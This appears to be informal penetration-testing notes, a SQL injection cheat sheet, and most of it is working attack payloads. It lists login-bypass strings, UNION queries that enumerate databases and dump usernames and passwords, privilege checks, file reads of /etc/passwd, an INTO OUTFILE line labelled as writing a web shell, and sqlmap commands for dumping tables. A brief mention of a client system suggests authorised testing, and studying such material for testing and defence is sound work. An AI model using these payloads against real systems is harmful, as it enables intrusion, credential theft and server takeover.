SQLI
    injecting a single quote can cause weird behavior of app indicating possible injection point
    Try all get(through url),post(burp) parameters and inject in headers also(burp)
    when testing boolean sqli,a true condition shows as normal while false causes app to malfunction

 ### basic boolean sqli
   web app uses select example,example2 from table_name where id=somevalue . We add our payload to make it a boolean condition
   This query dump all the information which is queried and we only check comdition with the parameter to make statement true

    ' or 1=1--        

    if basic or statemnet doesnt work try substituing or with it symbol || and try # for cemmnting instead of --

    ' || 1=1#

 ### basic union sqli
   Union based sqli doesnt ignore the app sql query as there is no boolean condition so application query is executed alongside our crafted query
  Union joins different sql queries together
  **We dont know that how many attributes is the application asking in the query which we manipulate**
    **to tackle that we can use following payload**
  ***'union select null,null;***   we can keep increasing amount of nulls in our query and at which number web app dont give any error,thats the right amount of columns
  **We can also do this by using ORDER By 1,order by 2(keep increasing orders until you get right amount of columns)**

' union select username,password from table_name where 1=1;

 #### local database username
 we can see the database user using user() function ; 
 Query is   ' union select user();-- -   

    admin' or '1'='1 Basic Auth Bypass
    admin')-- - Basic Auth Bypass With comments
    ' order by 1-- - Detect number of columns using order by
    cn' UNION select 1,2,3-- - Detect number of columns using Union injection
    cn' UNION select 1,@@version,3,4-- - Basic Union injection
    UNION select username, 2, 3, 4 from passwords-- - Union injection for 4 columns
    SELECT @@version Fingerprint MySQL with query output
    SELECT SLEEP(5) Fingerprint MySQL with no output

    cn' UNION select 1,database(),2,3-- - Current database name
    cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - List all databases
    cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- - List all tables in a specific database
    cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- - List all columns in a specific table
    cn' UNION select 1, username, password, 4 from dev.credentials-- - Dump data from a table in another database
    cn' UNION SELECT 1, user(), 3, 4-- - Find current user
    cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- - Find if user has admin privileges
    cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- - Find if all user privileges
    cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- - Find which directories can be accessed through MySQL
    cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- - Read local file

    select 'file written successfully!' into outfile '/var/www/html/proof.txt' Write a string to a local file

    cn' union select "",'', "", "" into outfile '/var/www/html/shell.php'-- - Write a web shell into the base web directory

    Using SQLMAP
If sqlmap dosent give results back try different level values and risk values for more intense scan
    sqlmap -u -p rest flags

--technique=U(for union),B(for boolean),T(Time based)

    We can save the request of vulnerable page from burp and then pass it to Sqlmap
    sqlmap -r request.req rest of flags

    we need to see the database info step by step to not stress the client system. We can also save the burp request file and pass it to the sqlmap and then just specify our technique(sqlmap can also automatically do it) and flags as follows.

    sqlmap -u http://url/path.php/(no need to give if burp file is given) --technique=B --dbs This will display the databases
    sqlmap -u http://url/path.php/(no need to give if burp file is given) --technique=B -D dbname --tables This will display tables in the specified database
    sqlmap -u http://url/path.php/(no need to give if burp file is given) --technique=B -D dbname -T tablename --columns This will display all the coloumns in the asked table
    sqlmap -u http://url/path.php/(no need to give if burp file is given) --technique=B --D dbname -T tablename -C coloumnnames --dump This will dump all the data in the coloumns of table

